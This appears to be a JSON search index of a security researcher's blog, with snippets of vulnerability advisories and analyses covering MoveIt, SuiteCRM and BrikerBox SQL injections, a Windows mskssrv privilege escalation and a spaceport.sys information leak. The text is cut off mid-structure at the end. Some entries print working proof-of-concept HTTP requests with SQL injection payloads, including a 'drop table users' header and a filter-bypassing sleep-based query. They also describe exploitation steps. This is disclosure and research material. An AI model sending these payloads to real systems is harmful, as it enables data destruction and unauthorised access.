[
  
  {
    "title": "RabbitMQ Server for Windows LPE",
    "url": "/posts/RabbitMQ-server-LPE/",
    "categories": "advisory",
    "tags": "",
    "date": "2024-01-25 22:50:40 +0100",
    





    "snippet": "to come"
  },
  
  {
    "title": "CVE-2023-36932 - Progress MoveIt authenticated SQLi",
    "url": "/posts/MoveIt-CVE-20232-36932/",
    "categories": "advisory",
    "tags": "",
    "date": "2024-01-25 22:50:40 +0100",
    





    "snippet": "TL;DRA SQL injection can be triggered through header crafting, for MySQL backend, in moveitisapi.dll. This SQLi can only be triggered authenticated, and I do not know if there is a configuration under which it could have beeen exploited. So clearly this vulnerability would fall under the Low or even None severity.To note: I’m almost certain that CVE-2023-36932 describes multiple SQL injection vulnerabilities, and I only reported one.Description:Quite late to the vuln research party following the 0day exploitation surge in June 2023, I decided to spend a few hours looking for SQLi on an area that should be less scrutinized than the core logic of MoveIt Transfer application, which is the ISAPI dll-moveitisapi.dll. Indeed, it’s binary code that is intrinsicaly harder to research than .Net code that can be decompiled.moveitisapi.dll handles several HTTP requests by itself. One of them allows a user to download a “large” file. Inside the function responsible to handle this download, multiple values are extracted from the headers of the HTTP requestfor further processing, such as the username, the password, or the FileID:In case the request is determined to not use machine2 URL, moveitisapi.dll will handle the rest of the request itself. To do so, it will execute several SQL queries, especially the following one: SELECT * FROM files WHERE ID=&#39;XXX&#39; where the FileID is extracted from the X-siLock-FileID header:As seen in the code snippet, this header is neuteurized before the SQL query, through a function I personally call escape_sql.Within this function, as the third argument passed to it is null, ticks will be doubled, but escape_sequence \\ are left as is. This means it’s possible to escape the neuteurization and to obtain a valid payload for MySQL backend (MSSQL won’t work), through the following payload \\&#39; that gets transformed into \\&#39;&#39;.One example to trigger a potential SQL injection payload would be to use the following HTTP header: X-siLock-FileID: 123\\&#39;; drop table users;#, that once escaped and inserted into the query creates the following SQL query: SELECT * FROM files WHERE ID=&#39;123\\&#39;&#39;; drop table users;#&#39;; POC      obtain a valid session to make sure machine2 is not used.        send the following request but with the session obtained at previous step:    GET /moveitisapi/moveitisapi.dll?action=download HTTP/1.1 Host: localhostX-siLock-FileID: 123\\&#39;; drop table users;#X-siLock-Username: b5ddiwqgrfr3k315X-siLock-IPAddress: 127.0.0.1X-siLock-AgentBrand: titiX-siLock-AgentVersion: 1Cache-Control: max-age=0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Cookie: ASP.NET_SessionId=fe3cryhlppu1tml4zvij1cj2Connection: close      Impact/ExploitationI encountered several problematics while trying to exploit the vulnerability:      the FileID header can be filled with 32 characters max. Hence it’s not possible to trigger a SQL query that would allow for privilege escalation. There is no leak of information so it can’t be used for that either. Only remaining possibilities are to alter availability by destroying database (using DROP TABLE or shutdown), or to try to use SQL injection to download files we should not.        Using the SQL injection to try to download files we are not supposed to does not appear possible: there is a folderperms SQL request that is done afterwards to check whether the user can download the file. For this SQL query, the escape_sql function third argument is set to 1 while using MySQL, making the injection not possible.        finally, if we try to alter availability through DROP TABLE or shutdown, by default we should obtain the following log that indicates an error:       ```  &amp;lt;timestamp&amp;gt;  328:Error running SQL: SELECT * FROM files WHERE ID=&#39;123\\&#39;&#39;; drop table users;#&#39;;  &amp;lt;timestamp&amp;gt;  328:** The error was [MySQL][ODBC 8.0(w) Driver][mysqld-8.0.32-commercial]You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;drop table users;#&#39;&#39; at line 1  &amp;lt;timestamp&amp;gt;  328:Reconnecting to DB because query failed  &amp;lt;timestamp&amp;gt;  328:Reconnected to DB OK  &amp;lt;timestamp&amp;gt;  328:Error running SQL: SELECT * FROM files WHERE ID=&#39;123\\&#39;&#39;; drop table users;#&#39;;  &amp;lt;timestamp&amp;gt;  328:** The error was Cannot change the ActiveConnection property of a Recordset object which has a Command object as its source.  &amp;lt;timestamp&amp;gt;  328:Using machine2 because query failed a second time  ```        This error appears to be there because the MYSQL_OPTION_MULTI_STATEMENTS_ON option is not set while connecting to the database through the ODBC driver. To be honest, I don’t know if there are cases where this option can be set by installation, or if a given user who modified the connection string in the DMZConfig2.exe application could have this option set.  To conclude, I was not able to fully exploit the vulnerability. Still, Progress thankfully accepted the report for defense in depth purpose."
  },
  
  {
    "title": "ColdFusion RCE using WDDX deserialization - Story and details behind CVE-2023-26359 and CVE-2023-29300",
    "url": "/posts/ColdFusion-WDDX-2023/",
    "categories": "blogpost",
    "tags": "",
    "date": "2024-01-25 22:50:40 +0100",
    





    "snippet": "see"
  },
  
  {
    "title": "BrikerBox and Briker IPPBX SQL injection",
    "url": "/posts/Briberbox-SQLi/",
    "categories": "advisory",
    "tags": "",
    "date": "2024-01-25 22:50:40 +0100",
    





    "snippet": "DetailsAt the start of August, an advertisement popped on cybercrime forums for a 0day affecting both the open-source and the paid version (Brikerbox) of the Briker IPPBX software, used mostly in Indonesia. Following more in-depth investigation, it was possible to uncover the vulnerability:In the /var/www/apps/ippbx/recordings/includes/main.conf.php file (reachable directly), there is a SQLi at line 76:$db_query = &quot;SELECT password FROM mi_tblUser WHERE status=&#39;2&#39; AND username = &#39;&quot;.$_POST[&#39;username&#39;].&quot;&quot;;As this file is part of the login flow, it allows for unauthenticated attack, in particular against the following endpoints:  /apps/ippbx/recordings/recordings.php  /apps/userportal/userportal.php -&amp;gt; authentication page of the applianceUsers credentials being stored in clear text in the database, using SQLi to obtain an admin account is straightforward.BrikerBox vendor was contacted late August 2023. Previously exposed instances appear unreachable anymore. Still, Brikker IPPBX- the open-source version- is still vulnerable."
  },
  
  {
    "title": "CVE-2023-5350 - SuiteCRM &lt; v7.14.0 authenticated SQL injection",
    "url": "/posts/cve-2023-5350-SuiteCRM-SQLi/",
    "categories": "advisory",
    "tags": "",
    "date": "2024-01-11 02:50:40 +0100",
    





    "snippet": "TL;DRAuthenticated SQL injection affecting the Opportunities module of SuiteCRM for versions prior to 7.14.0DetailsAt CrowdStrike, following claims from a threat actor to have hacked SuiteCRM at multiple entities using a SQL injection, I started a little audit of SuiteCRM to uncover whether the threat was realistic or not. Upon research, I stumbled on the modules/Opportunities/Save.php file, in which we can find the following code:require_once(&#39;modules/Opportunities/OpportunityFormBase.php&#39;);$opportunityForm = new OpportunityFormBase();$opportunityForm-&amp;gt;handleSave(&#39;&#39;,true,false);The handleSave function may end up calling the clone_relationship function, using the duplicate_parent_id POST variable as 4th argument:Within the clone_relationship function, a SQL query is created with this 4th argument, that could lead to SQL injection:function clone_relationship(&amp;amp;$db, $tables, $from_column = null, $from_id = null, $to_id = null){    [...]            $query = &quot;SELECT * FROM $table WHERE $from_column=&#39;$from_id&#39;&quot;;        }        $results = $db-&amp;gt;query($query);    [...]At that point, several security measures prevent direct exploitation of this SQL injection:  The Save.php file cannot be accessed directly due to a .htaccess directive setting up a 403 unauthorized access on modules directory.  The Save.php requires a valid “SugarEntry” entrypoint, that gets defined by going through the index.php endpoint with the action=Save and module=Opportunities parameters. However, doing so, the POST variables are filtered (quote gets encoded) against basic SQL injection through the use of the clean_incoming_data function.Yet, the clean_incoming_data function can be tricked into leaving quotes unencoded, as highlighted by this previous bounty report. Yet, the inner working of this bypass was not explained.Typically, the clean_incoming_data function calls the inner securexss function on each $_POST value. This securexss function first encodes quotes and then calls the xss_clean function from Voku. This xss_clean function decodes all characters present in the input string to clean; in order to detect and strip all the javascript related words afterwards. In case a javascript payload is detected by the function, then the cleaned up (and so decoded) string is returned. In case there is no payload detected, then the original string is returned (the encoded one). By integrating &amp;lt;script&amp;gt; in the SQL payload, xss_clean decodes the string (transform back the encoded quote to a decoded one), detect the attack and remove the &amp;lt;script&amp;gt; tag before returning the string with the decoded quote.Here is an example request showing SQL injection by triggering a 5 seconds sleep by SuiteCrm application:POST /suitecrm/index.php HTTP/1.1Host: &amp;lt;redacted&amp;gt;Content-Length: 633Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: &amp;lt;redacted&amp;gt;Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://&amp;lt;redacted&amp;gt;/suitecrm/index.phpAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: EmailGridWidths=0=10&amp;amp;1=10&amp;amp;2=150&amp;amp;3=250&amp;amp;4=175&amp;amp;5=125; Users_sp_tab=All; Opportunities_sp_tab=All; ck_login_language_20=en_us; ck_login_theme_20=SuiteP; sugar_user_theme=SuiteP; PHPSESSID=7t8i63rduuadi6vg2n5tsemrq9; ck_login_id_20=d1c6197a-c7cf-4d2f-6970-649c44bd341aConnection: closemodule=Opportunities&amp;amp;record=&amp;amp;duplicateSave=true&amp;amp;duplicate_parent_id=1&amp;lt;/script&amp;gt;&#39;%20UNION%20SELECT%20sleep(5),1,2,3,4,5%20--%20-&amp;amp;duplicateId=3005bd81-1904-8e56-d5f5-649d55cc7438&amp;amp;isDuplicate=false&amp;amp;action=Save&amp;amp;return_module=Opportunities&amp;amp;return_action=DetailView&amp;amp;return_id=&amp;amp;module_tab=&amp;amp;contact_role=&amp;amp;offset=1&amp;amp;name=test23&amp;amp;account_name=testaccount&amp;amp;account_id=9bf1efd4-30c2-9e99-067c-649d4e24e2bf&amp;amp;currency_id=-99&amp;amp;date_closed=09%2F07%2F2023&amp;amp;amount=1%2C000%2C000.00&amp;amp;opportunity_type=&amp;amp;sales_stage=Prospecting&amp;amp;lead_source=&amp;amp;probability=10&amp;amp;campaign_name=&amp;amp;campaign_id=&amp;amp;next_step=&amp;amp;description=&amp;amp;assigned_user_name=gg+Administrator&amp;amp;assigned_user_id=1Proposed patchThe following modifications were proposed to secure the vulnerability:  Use focus-&amp;gt;db-&amp;gt;quote in front of the $_POST[&#39;duplicate_parent_id&#39;] variable in the clone_relationship call to make sure quotes are escaped -&amp;gt; implemented (commit)  Modify the securexss function to encode the string after the xss_clean function call -&amp;gt; vendor argued testing was necessary before incorporating this change, which is understandable. Last time I checked it was not implemented.Timeline30 Jun 2023 : initial report30 Jun 2023 : vendor confirmation29 Aug 2023 : update available"
  },
  
  {
    "title": "A look at CVE-2023-29360, a beautiful logical LPE vuln",
    "url": "/posts/CVE-2023-29360-analysis/",
    "categories": "blogpost",
    "tags": "",
    "date": "2023-08-18 22:50:40 +0100",
    





    "snippet": "IntroductionWhen looking for vulnerabilities of interest, it’s always a good option to look for vulnerabilities used at pwn2own. Indeed, these vulnerabilities are exploited during the competition, meaning they indeed have a practical impact. This year, I got my interest piqued during my freetime by a LPE (CVE-2023-29360) reported by Thomas Imbert(@masthoon) for the following reasons:  Thomas is recognized as one of the several highly skilled researchers in the French exploit scene, and is certainly knowledgeable  The vulnerability, teased in the HITB upcoming conference, is described as: “a logical bug that defeats most mitigations by allowing direct read and write access to kernel virtual memory”In fact, I was not disappointed at all and learnt a lot from the analysis I made, and thought I would share the root cause analysis.disclaimer: In this post I will describe the root cause of the vulnerability while omitting some details for full reproduction for obvious reasons. As I was not really acquainted with the underlying stuff revolving around that vulnerability before starting my analysis, I may have made some mistakes.Finding the root causeStarting with the ZDI’s advisory of the vulnerability, it is possible to get enough details to look for the root cause. Typically, the important information is:  The vulnerability is present in the mskssrv driver  The issue results from the lack of proper validation of a user-supplied value prior to dereferencing it as a pointerThe next step is to patch-diff the driver for the update correcting the vulnerability. Only one function—named FsAllocAndLockMdl—was modified. Within that function, the AccessMode parameter of the call to MmProbeAndLockPages was changed from KernelMode to UserMode, as shown in the following screenshot:With the root cause found, let’s analyze the vulnerability.Understanding the vulnerabilityMDL, what is that?An I/O buffer that occupies a contiguous virtual memory range can be non-contiguously distributed over several physical pages in memory. The Windows OS utilizes memory descriptor list (MDL) structures at the kernel level to describe a single virtual memory buffer’s physical page layout. MDLs vary in size, are semi-opaque, and are composed of a header that describes the MDL’s properties and a variable-size array of pointers—called the page frame number (PFN) array—describing the physical addresses used by the MDL. Inside the header, the virtual address (VA) of the memory buffer that is physically described by the MDL is present, as well as its length.The following schematics illustrates the concept of MDL:MDL creation and interaction is reserved to the components operating in kernel mode like drivers, even though a user land process may be able to do so via a communication channel with a driver.It should be noted that an address that is already mapped and potentially in use by the OS can have its physical page layout described by a new MDL. In this case, the component accessing this MDL will be able (overly simplified) to directly access the physical memory pointed to by this buffer VA. This creates a communication channel between this component and the OS component that is already interacting with the VA.As a consequence, MDLs can allow drivers for the Windows OS to implement Direct Memory Access (DMA) operations and permit to avoid memory-copy operations between the user land and the kernel land (Direct I/O).Inner working of IoAllocateMdl and MmProbeAndLockPagesIn the vulnerable function FsAllocAndLockMdl, two APIs permitting to interact with MDLs are used: IoAllocateMdl and MmProbeAndLockPages.The first API—IoAllocateMdl—allocates the MDL structure’s storage to the virtual memory, sets the buffer VA that the MDL describes in its header, but does not initialize the PFN array describing the physical memory that will be used for the buffer. In fact, it should be coupled with a second API call that is responsible for establishing this array, thus acquiring the correct physical memory to describe it.The second API—MmProbeAndLockPages— first probes the buffer VA described by the MDL—i.e. it will check if this buffer VA can be accessed—in case the the AccessMode parameter is set to UserMode. Next, this function locks the physical pages, making them unable to be paged, reallocated, and freeable; while setting the access operation (read and/or write).Let’s describe in what consists the probing: as already described, new MDLs can be created to get the physical description of a given virtual address’s buffer already in use by the OS, and potentially to directly interact with the physical memory associated with this buffer. In particular, it can be used against various data already in use at the kernel level. This is a problem when the MDL parameters come from the user-land (for instance because that user-land process aims to perform a DMA operation), for example through a DeviceIO control message made to a driver. Indeed, if the user-land process passes in kernel pointers for the creation of the MDL, and is then able to interact with it, that means this user-land process would be able to interact with kernel data. As a consequence, the user/kernel barrier is broken. To avoid this problem, the probing simply checks that the buffer VA in the MDL is not in the kernel-land, by checking the address is not superior to 0x7FFFFFFF0000.Explaining the root causeThe FsAllocAndLockMdl function is reachable through a DeviceIO control message with code 0x2f0408 . In particular, the parameters for the MDL creation are directly taken from the user-supplied SystemBuffer. As the AccessMode parameter of MmProbeAndLockPages was not correctly set to UserMode, no probing of the MDL occurs. As a consequence, the user can create a MDL pointing to critical kernel data.As CVE-2023-29360 was exploited, it means there is a way for the user to interact later with the arbitrarily created MDL, especially to directly modify the kernel data pointed by it. In particular, it appears that a second DeviceIO control message with code 0x2f0410, permits to map the previously created MDL’s physical memory directly in the user-land process’s memory, inside a variable with read and write access. This mapping is realized through the MmMapLockedPagesSpecifyCache API. As a consequence, accessing this variable as a pointer allows the physical pages used in the MDL to be accessed and modified directly.Exploiting the vulnerabilityOne approach to exploit CVE-2023-29360 is to first obtain a MDL describing the kernel VA where the current process privileges are defined (the kernel VA being simply obtained through a NtQuery leak), using the first DeviceIO control message. Subsequently, this MDL is mapped through the second DeviceIO control message. As a consequence, the values located at the kernel VA where the current process privileges are defined are now directly accessible and modifiable in the current process’s virtual memory. The process can now freely modify its own privileges and achieve privilege escalation, for example by getting the SeDebugPrivilege.The following steps highlight how the identified exploit approach works:      The exploit process is launched. After launching, the memory layout is as follows:          The exploit process sends the first DeviceIO control message to mskssrv, inducing the creation of a MDL pointing to its own privileges in the kernel address space, thanks to the absence of check. The memory layout is now the following:          The exploit process sends the second DeviceIO control message to mskssrv, mapping the physical memory pointed by the MDL in its own virtual address space. The memory layout becomes:          The exploit process can now directly modify the physical memory values tied to its own privileges, to make itself highly privileged.  ConclusionThis logical vulnerability is really powerful as it may allow for direct kernel read/write. As stated by Thomas, no mitigation currently halts a similar exploit for it. This might change soon with the modification of the NtQuery leaks in-the-works, as such exploits will necessitate a first vulnerability to leak the kernel address of interest.Finally, I would like to thanks Thomas Imbert one more time for having found it as I learnt a lot while analyzing it.By the way, this attack surface might have been underlooked. Setting up the following bad yara rule for variants leads to a few results, eheh:rule search_cve_2023_29360_variant{    meta:        version = &quot;102947593&quot;    strings:        $api1 = &quot;MmProbeAndLockPages&quot;        $api2 = &quot;MmMapLockedPagesSpecifyCache&quot;        $s2 = { 33 D2 44 8D 42 01 } //xor edx, edx, lea r8d, [rdx+1]    condition:        uint16(0) == 0x5a4d and all of them}"
  },
  
  {
    "title": "The new Component Filter mitigation",
    "url": "/posts/component-filter-mitigation/",
    "categories": "blogpost",
    "tags": "",
    "date": "2022-05-23 22:47:40 +0100",
    





    "snippet": "IntroductionMicrosoft introduced recently a new mitigation in the Windows kernel, dubbed “Component Filter”. The following blog post will explains what this mitigation is about, and how it actually works. Let’s dive in.The big pictureBefore going into the details of this new mitigation, I thought it would be better to present my own view of the aims of this new mitigation, and how it integrates with the current state of Windows’s kernel security policy. Hopefully, this is accurate enough, even if I’ll make some simplifications.  People who just want technical details could go to the next paragraph.This new mitigation is a new syscall disabling mechanism, but only for “components” of the windows kernel. Let’s see what that means:Historically, Windows promoted a programming paradigm for userland programs based on APIs, and not on syscalls. What this means is that Microsoft considered that syscalls are not something a standard userland program should do directly, and instead, those programs should use the programmatic Windows API. It implies that syscalls can be changed between multiple Windows releases (it’s still the case), and that Microsoft is entirely in control of this mechanism. It also implies that the Windows API is fixed, otherwise all the code relying on it has to change between Windows releases. That’s why we are seeing differently numbered APIs when changes are introduced (have a look for example at GetTempPathA and GetTempPath2A). On the contrary, Linux has a programming paradigm based on syscalls. This means syscalls are fixed, but the API is not. This explains the existence of the dup2 syscall to replace the dup one.This programming paradigm explains partly why Microsoft has not implemented any correct syscall filtering mechanism : those are not fixed! So, to provide some protection against malicious syscalls, Microsoft decided to implement a mechanism based on the disablement of syscalls given their underlying treating component. But what’s a treating component? It’s the module responsible to handle a given syscall in kernel land.For example, one could see Windows syscalls as divided in 4 big categories:  the graphic syscalls, handled by the win32k.sys component  the device syscalls (in fact IRPs passed through DeviceIoControl), handled by the corresponding device driver components  the direct NT syscalls, directly handled by the kernel  the indirect NT syscalls, which are dispatched by the kernel to some underlying components. Examples of such underlying components are the ones handling file systems operations : depending on the file system you use, you load the corresponding component. When you want to write a file, you use the same syscall whatever is the underlying file system; it is then dispatched to the correct component able to translate it to an appropriate operation for the file system.Here is a little schema resuming that:Microsoft first provided the win32k lockdown mechanism. Without going into details, based on a flag defined in the EPROCESS structure, a win32k syscall is not handled by the same function.This new component filter mitigation follows the same principle, but with more details : it will prevent transaction manager related syscalls that are dispatched towards the kernel transaction manager(KTM) component.How it works internallyFor this new mitigation to be operational, Microsoft implemented a new DisabledComponentFlags field in the EPROCESS structure. This field is an unsigned long and gets filled by the PspApplyComponentFilterOptions function. This function is called by the internal function PspAllocateProcess, and as such this new field can only get set when a process is spawned. The only way I found to define this field is through the usage of the STARTUPINFO attributes, through the UpdateProcThreadAttribute function.This DisabledComponentFlags gets checked by a new introduced function dubbed PsIsComponentEnabled in ntoskrnl. Here is its code:BOOL PsIsComponentEnabled(ULONG value){  return (PsGetCurrentProcess()-&amp;gt;DisabledComponentFlags == value);}The only component using this function is the tm.sys driver, which is the implementation of KTM. Inside this driver, the following functions are now using this PsIsComponentEnabled function :  NtCreateTransactionManagerExt  NtOpenTransactionManagerExt  NtQueryInformationTransactionManagerExt  NtRecoverTransactionManagerExt  NtRenameTransactionManagerExt  NtRollforwardTransactionManagerExt  NtSetinformationTransactionManagerExtFor all those functions the check related to the component is done at the beginning and is used like the following:if ( !PsIsComponentEnabled(COMPONENT_TRANSACTION_MANAGER /* == 1*/) )    return 0xC0000022;Using this new mitigationAs said before, you have to use the UpdateProcThreadAttribute function to actually spawn a process with this new mitigation. Here is a code to do so:STARTUPINFOEXA si;PROCESS_INFORMATION pi;SIZE_T size = 0;BOOL ret;ZeroMemory(&amp;amp;si, sizeof(si));si.StartupInfo.cb = sizeof(STARTUPINFOEXA);si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;// Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocatedInitializeProcThreadAttributeList(NULL, 1, 0, &amp;amp;size);// Allocate memory for PROC_THREAD_ATTRIBUTE_LISTsi.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(    GetProcessHeap(),    0,    size);//initialize the component filterCOMPONENT_FILTER cf;cf.ComponentFlags = 1;//create an attribute with a component filter structureUpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_COMPONENT_FILTER, &amp;amp;cf, sizeof(cf), NULL, NULL);// Finally, create the processret = CreateProcessA(    NULL,    (LPSTR) &quot;&amp;lt;command&amp;gt;&quot;,    NULL,    NULL,    TRUE,    EXTENDED_STARTUPINFO_PRESENT,    NULL,    NULL,    &amp;amp;si,    &amp;amp;pi);Once one of your process is spawned with this mitigation, you could try to create a volatile transaction manager with the following snippet, and see it fails:CreateTransactionManager(NULL, NULL, TRANSACTION_MANAGER_VOLATILE, TRANSACTION_MANAGER_COMMIT_DEFAULT);ConclusionThis new mitigation is actually a way to prevent 7 syscalls to be called within a process. Because there is no way to activate this feature outside of spawning a process with an additionnal attribute, this feature seems reserved for sandbox developers for now. As such, this mitigation is clearly niche.However, because the field associated with this mitigation is not fully used, I’m pretty sure we will see additional components to be filtered in the same way, especially file systems components like ntfs.sys or nfs.sys.Hopes for the futureAs a defender, I’m baffled by the level of syscall filtering achieved by Linux with seccomp and seccomp-bpf, and the current level of the same feature on Windows. Especially, without going into a complete filtering mechanism capable of inspecting arguments passed to syscalls, Microsoft already has all the mechanisms to provide a correct syscall disabling feature inside the kernel, named “token privileges”. Indeed, when you look at what those privileges do, they are in fact preventing the usage of given syscalls! So, I would really appreciate if someone from Microsoft could state on the following system and if it’s planned to implement something similar or not in future.Here is how I imagine a global syscall disabling mechanism can take place (based on how token privileges work):At the spawn of a process, you create two bitmaps inside the EPROCESS structure in place of current token privileges:  a bitmap defining the syscalls that can be activated by the said process  a bitmap defining the syscalls effectively enabled for the said processBasically, the first bitmap serves as the same field of the Present field of the _SEP_TOKEN_PRIVILEGES while the second one serves as the Enabled field.The first bitmap can be created based on the following factors:  the integrity level of the process  if the process is signed by Microsoft or a trusted party  if the process is created in special environments like Silo or AppContainers with capabilitiesThe second bitmap is created by copying the first one and updated with:  additional attributes given by UpdateProcThreadAttribute.  process mitigations definedLike token privileges, you then offer the ability to disable additional syscalls, but not the ability to activate ones that are not available inside the first bitmap.You finally just need a little checker inside the KiServiceInternal function which is the following://I consider _EPROCESS-&amp;gt;bitmapSyscallsEnabled to be a uint64_t*#define IS_SYSCALL_DISABLED(A,k) ((A[(k)/64] &amp;amp; (1&amp;lt;&amp;lt;((k)%64)))) == 0if(IS_SYSCALL_DISABLED(_EPROCESS-&amp;gt;bitmapSyscallsEnabled, &amp;lt;syscall number&amp;gt;)  return 0xc0000022;[...]With such a system, you have so :  a wider scope for syscall disabling than currently implemented systems  one system instead of multiple ones : easier maintenance (merge of component filter, win32k lockdown, SpAccessCheck and PspIsInSilo functions) and vulnerability management  the possibility to have a finer grain on syscall disabling in order to provide automatic barriers between the different integrity levels (based on the integrity level, some syscalls will be automatically disabled).Of course, this system poses a question about performance. Microsoft certainly also chose the current implementation to support corner cases that I’m not aware about. This would also require to deprecate functions reasoning about token privileges.To finish, I would say this system could not be complete without transforming all the “enum-based” syscalls (like the NtQuery and NtSet syscalls) into unitary syscalls. A simple example are the kernel leaks offered by the NtQuerySystemInformation function : those are actively used to achieve local privilege escalations from medium integrity, but they are all now under the same syscall."
  },
  
  {
    "title": "An analysis of CVE-2022-21877",
    "url": "/posts/an-analysis-of-cve-2022-21877/",
    "categories": "blogpost",
    "tags": "",
    "date": "2022-02-07 22:57:40 +0100",
    





    "snippet": "IntroductionI wanted to have some fun on patch diffing : on the latest “patch tuesday” update, Microsoft released a patch for an information disclosure vulnerability in the storage spaces controller. This vulnerability has been found by Quang Linh, working at STAR Labs.  Because leaking information is often easier than a full blown RCE/LPE exploit, I selected this vuln because it would take less time to analyze on my spare time. The following article will be organized as follows:  patch diffing and discovery  triggering it  getting a controlled leak?  conclusion  some spaceport.sys documentationPatch diffing and discoveryThe first question to answer is : where should I look at? Indeed, Windows bulletins are now more abstract than ever. Fortunately, previous vulnerabilities found on this component by Fabien Periguaud(@0xf4b) and the ZDI bulletin both point to look at the spaceport.sys driver. I got the december and january versions of this driver, loaded it in IDA, and used bindiff to look for the modified code. Here are the results:  no difference in unmatched functions  3 changed function in the “matched functions” window, which is nice from an analysis point of view (SpIoctlCreateTier, SP_POOL::SetTierInfo, SP_POOL::SetSpaceInfoTransaction):Only by looking at the names, one can see the vulnerability seems related to Tier object. Let’s analyse the changes further. In the SpIoctlCreateTier function, the following code has been changed (you can click on the image for a better view):First, Microsoft introduced a safe addition ensuring no integer overflow occurs. The members of this addition are the offset where GUIDs should be copied from the IRP’s system buffer, and the total size taken by those GUIDs. Furthermore, the result of this operation is checked against the total length field of the IRP’s system buffer written inside the said buffer. (A check at the beginning of the function ensures this length is indeed equal to the length of the IRP’s buffer.)In the SpIdsCopyHelper function called afterwards, memory is allocated with a size corresponding to the total size taken by the GUIDs, and the GUIDs pointed by the given offset are then copied into this newly allocated memory. This allocated memory is then integrated within the SDB_TIER object created. This SDB_TIER object itself is registered inside an SDB_POOL_CONFIG object, and it finally gets destroyed.Before the patch, by providing a malicious offset inside the buffer, one could copy content of memory outside of the IRP’s system buffer into the SDB_TIER object:The remaining two patched functions are also patched in the same way. Once again, it was possible to give an arbitrary offset inside the IRP buffer leading to the same problem.Triggering itFrom the little analysis made on previous paragraph, here are the necessary steps to trigger the vulnerability:  Ensure we have a pool on the machine : this is automatically done by Microsoft once you have three disks on the machine. If I’m not mistaken, you cannot create pool while there are less disks.  Call one of those function that permits to leak memory  retrieve the leaked memory that has been registered inside the SDB_POOL_CONFIG object. This can be done by calling SpIoctlGetTierInfo or SpIoctlgetSpaceInfo respectively to the function used to leak memory.Unfortunately, the step 2 is protected by two checks:First, one needs a valid pool ID. This is not a problem : pools’ IDs can be listed using SpIoctlGetPools, which is not protected from a standard user. Second, one needs to pass the SpAccessCheckPool function, which -as its name suggests- checks if you have the necessary rights to do the operation. This function in fact checks against the SpControlExt object’s security descriptor if the current context of the operation has the valid right (the access mask associated with the underlying SeAccessCheck function is TOKEN_MANDATORY_POLICY_VALID_MASK). In a default configuration, that means the access is validated for the local administrators group and the system account. One could find that strange, because admin to kernel is not considered a security boundary by Microsoft. However, as pointed out by Quang Linh on Twitter, an administrator could have set up a security descriptor allowing full access to a pool for a given user, thus allowing a simple user to trigger the vulnerability on the said pool. Here is a way to do so in Powershell (certainly not the optimal one):Get-WmiObject -Namespace &quot;root/microsoft/windows/storage&quot; -Class MSFT_StoragePool# from the result, get the path of the given pool# now we can set up the security descriptor# first get itInvoke-WmiMethod -path  &#39;&amp;lt;your_path&amp;gt;&#39; -name GetSecurityDescriptor  ...  SecurityDescriptor : O:BAG:SYD:(A;;FX;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)  ...# now set additional access rights to the given user sidInvoke-WmiMethod -path  &#39;&amp;lt;your_path&amp;gt;&#39; -name SetSecurityDescriptor -ArgumentList &quot;O:BAG:SYD:(A;;FA;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;&amp;lt;user_sid&amp;gt;)&quot;Well, time to trigger the vulnerability!You can find the associated code within this github repository. To be able to run the code, you need to be administrator and to give the name of a pool for whom a tier can be created (tiers cannot be created on the primordial pool apparently).Getting a controlled leak?One of the question that arises from the vulnerability is: can it be used to leak a given kernel object of interest? Here are a few observations obtained through the use of Windbg (whose results are to be taken with caution because I did not go deep in the reverse of this part):  The system buffer appears to be allocated in the NonPagedPoolNxCacheAligned pool.  Whenever I checked the buffer, it seems to be aligned on a page. Because I was able to get the same leak randomly, it may seems this page is taken from a pool of pages for Io operations. Perhaps there is some kind of lookaside list in the Io manager?  This page appears to be formed of the chunk corresponding to the system buffer, and then empty/free space.I also tried quickly to allocate pool blocks, and then freed particular ones, in order to create holes that could be used by the IRP buffer. This test was a fail, but it may be due to the test itself that was badly executed.So in the end, I have no idea if it’s possible to get a given object behind the buffer of an IRP. Perhaps people like Yarden Shafir, Corentin Bayet or guys of KunlunLab would know. If so, I would love to hear about it. Anyway, I’ll certainly go back to this for a future post.ConclusionBecause one needs to be already in the local administrators group to trigger the vulnerability, its real impact appears low. Indeed, from an attacker perspective, this vulnerability appears useless as a mean to gain more information than what the attacker could already get with his rights. However, this is still a a somewhat memory corruption vulnerability that got corrected here, and it may prevent the introduction of the same vulnerable pattern inside spaceport.sys in the future.A bit of spaceport.sys documentationThe following documentation was obtained through reverse engineering, in order to trigger the leak. Given the low impact of this vulnerability, I did not bother to go deep in the reverse and as such the following documentation is quite harsh. Please be indulgent.  SpIoctlGetPools:          purpose : lists all the pools on the machine      IOCTL code: 0xE70004      input: an empty buffer whose length is at least equal to 4 bytes.      output : a structure like the following, where N is equal to the number of pools on the machine        typedef struct {    ULONG nbPools;      // == N    GUID listGuids[N];  // a list of all the pools&#39; GUIDs} POOLSLIST, *PPOOLSLIST;        SpIoctlGetPoolInfo          purpose : get the information about a pool      IOCTL code: 0xE70008      no particular access check              input:        a buffer whose size is superior to 0x28, with the following fields:                  the input buffer size, equal to 0x28, as a dword at offset 0          the pool GUID at offset 4                This is equivalent to fill in the two fields size and poolGUID in the same structure than for output.            output: the following structure:        typedef struct{  int size;  GUID poolGUID;  int field_14;  wchar_t friendlyName[256];  wchar_t description[1024];  __int16 field_A18;        //because needs more reversing  BYTE gapA1A[82];          //because needs more reversing  int thinProvisioningAlertThresholds;  BYTE gapA70[143];         //because needs more reversing  char 